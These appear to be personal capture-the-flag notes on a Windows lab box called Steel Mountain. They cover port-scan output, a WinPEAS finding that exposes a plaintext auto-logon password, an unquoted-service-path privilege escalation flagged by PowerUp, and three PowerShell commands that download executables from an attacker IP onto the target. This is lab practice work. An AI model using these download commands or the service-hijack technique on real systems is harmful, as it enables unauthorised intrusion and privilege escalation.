## STEEL MOUNTAIN

# OPEN PORTS
```
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2021-08-21T02:11:26+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2021-08-20T02:06:32
|_Not valid after:  2022-02-19T02:06:32
|_ssl-date: 2021-08-21T02:11:32+00:00; +5s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC

```
# OS INFO
```
Windows Server 2008 R2 - 2012
```

# WinPEAS Enum

No AV detected

BILL HAS AUTO LOGON ENABLED
Username: bill
Password: PMBAf5KhZAxVhvqb

# PowerUp.ps1

# Vulnerable Service with write perms

```ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

powershell -c "$source = 'http://10.2.87.252:443/winPEASx64.exe' $destination ='C:\Users\bill\Desktop\winpeas.exe' Invoke-WebRequest -Uri $source -OutFile $destination"

powershell -c wget "http://10.2.87.252/wp.exe" -outfile "winPEAS.exe"

powershell -c "Invoke-WebRequest -Uri 'http://10.2.87.252/wp.exe' -OutFile 'C:\Users\bill\Desktop\winpeas.exe'"